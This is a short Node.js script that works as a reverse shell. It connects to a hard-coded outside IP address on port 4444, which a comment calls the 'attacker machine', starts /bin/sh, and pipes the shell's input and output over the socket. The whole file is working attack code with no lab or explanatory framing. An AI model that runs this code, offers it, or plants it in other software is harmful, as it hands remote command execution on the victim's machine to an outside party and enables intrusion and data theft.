const net = require('net');
const { spawn } = require('child_process');

const HOST = '141.136.44.52';
const PORT = 4444;

// Create connection to attacker machine
const client = new net.Socket();

client.connect(PORT, HOST, () => {
    console.log('Connected to ' + HOST + ':' + PORT);
    
    // Spawn shell process
    const shell = spawn('/bin/sh', []);
    
    // Pipe shell output to socket
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);
    
    // Pipe socket input to shell
    client.pipe(shell.stdin);
    
    // Handle shell exit
    shell.on('exit', (code) => {
        client.end();
    });
});

// Handle connection errors
client.on('error', (err) => {
    console.error('Connection error:', err.message);
    process.exit(1);
});

// Handle connection close
client.on('close', () => {
    console.log('Connection closed');
    process.exit(0);
});

